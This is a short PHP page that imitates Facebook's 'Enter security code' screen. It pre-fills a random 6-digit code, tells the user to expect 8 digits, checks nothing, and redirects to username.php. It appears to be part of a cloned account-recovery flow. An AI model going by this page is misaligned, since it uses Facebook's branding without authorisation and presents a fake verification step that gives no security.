<?php 
session_start();
include 'conn.php';
$generate = "1234567890";
$code = substr(str_shuffle($generate),0,6);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="code.css">
    <title>Facebook</title>
</head>
<body>
    <div class="main">
        <h3>facebook</h3>
        <div class="form">
            <form method="post">
                <h4>Enter security code</h4>
                <hr>
                <p class="please">Please check your emails or phone for a message with your code.Your code is 8 numbers log.</p>
                <div class="box">
                <input type="number" name="code" id="" value="<?php echo $code;?>" placeholder="Enter code">
                <div class="inside-box">
                <h5>We provided your code in the popup alert box:</h5>
                <p>xxx@xxxx.com</p>
                </div>
                </div>
                <hr>
                <div class="bottom">
                    <p><a href="#">Didn't get a code?</a></p>
                    <div class="btn">
                        <button class="cancel">Cancel</button>
                        <button class="continue" name="submit">Continue</button>
                        <?php 
                        if (isset($_POST['submit'])) {
                            header("Location:username.php");
                        }
                        ?>
                    </div>
                </div>
            </form>
        </div>
    </div>
</body>
</html>